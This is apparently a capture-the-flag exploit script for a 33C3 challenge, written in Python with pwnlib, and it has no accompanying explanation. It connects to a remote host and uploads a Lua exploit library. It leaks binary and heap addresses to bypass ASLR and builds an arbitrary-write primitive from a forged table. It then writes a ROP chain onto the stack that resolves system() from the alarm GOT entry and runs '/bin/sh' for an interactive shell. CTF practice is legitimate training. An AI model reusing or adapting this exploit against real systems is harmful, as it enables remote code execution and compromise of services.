from pwnlib import *

# 33C3_h3_wh0_c0ntrol5_th3_byt3c0de_contr0ls_th3_r1p



###########################

def parse_funcs(result):
	funcs = [r for r in result.split("\n") if "function: " in r]
	funcs = [int(f.split("0x")[1], 16) for f in funcs]
	return funcs

def make_fake_table(target):
	fake_table  = ""
	fake_table += "A"*8
	fake_table += pq(target)
	fake_table += pq(target)
	fake_table += pattern(0x80 - len(fake_table))
	return fake_table

def emplace_fake_table(target):
	fake_table = make_fake_table(target)
	s.send(""" fake_table = string.fromhex("%s") \n""" % fake_table.encode("hex"))
	s.send(""" print("fake_table: ", tonum_fn(fake_table)) \n""")
	s.ru("fake_table: \t")
	fake_table_addr = (uq(struct.pack("<d", eval(s.ru("\n")))) & ~7) + 0x18
	return fake_table_addr

def write(target, value):
	fake_table_addr = emplace_fake_table(target)
	s.send(""" setlist_fn(0x%x, 0x%x) \n""" % (fake_table_addr, value))



###########################



#s = Socket(("localhost", 1610))
s = Socket(("78.46.224.72", 1337))

### send over our exploitation library
exploit_lib = open("./exploit_repl.lua").read()
s.send(exploit_lib)
print s.ru("<-- end of stage 1 -->")


### beat ASLR
s.send("math.log\n")
s.ru("function: ")
bin_base = int(s.ru("\n"), 16) - 0x32db0

s.send("read_tab = {0}\n")
s.send("read_tab\n")
s.ru("table: ")
read_tab_addr = int(s.ru("\n"), 16) 

print "read_tab: 0x%x" % read_tab_addr

write(read_tab_addr + 0x10, bin_base + 0x23b0c0 )
write(read_tab_addr + 0x18, bin_base + 0x345f0)
write(read_tab_addr + 0x20, bin_base + 0x345f0)
write(read_tab_addr + 0x28, 0)
write(read_tab_addr + 0x30, 0)
write(read_tab_addr + 0x38, 0)
write(read_tab_addr + 0x40, uq("/bin/sh\x00"))

s.send("read_tab[1] = 0x1234\n")
s.send('print("stack:", read_tab[1])\n"')
s.ru("stack:\t")
stack_ptr = int(s.ru("\n")) 

print "stack: 0x%x" % stack_ptr


pop_rsi = bin_base + 0x00000000000069a4
pop_rdi = bin_base + 0x0000000000006af8
alarm_got = bin_base + 0x23ae60 
pop_rbx = bin_base + 0x00000000000071db
rax_gadget = bin_base + 0x000000000001e796 # mov rax, qword ptr [rsi] ; ret
add_jmp = bin_base + 0x0000000000007c73 # add rax, rbx ; jmp rax



# 0x000000000000c1b2 : add rax, rcx ; jmp rax
# 0x000000000000d7cf : add rax, rdx ; jmp rax





payload  = ""
payload += "/bin/sh\x00"
payload += pq(pop_rsi)
payload += pq(alarm_got)
payload += pq(rax_gadget)
payload += pq(pop_rbx)
payload += pq(0xfffffffffffe21a0)
payload += pq(pop_rdi)
payload += pq(read_tab_addr + 0x40)
payload += pq(add_jmp)
payload += pq(0xcafebabe)








raw_input("> ")
for i, b in enumerate(blocks(payload, 8)):
	print i
	write(stack_ptr + 464 + i*8, uq(b))



write(stack_ptr + 248 , bin_base + 0x000000000000e205)





s.interact()
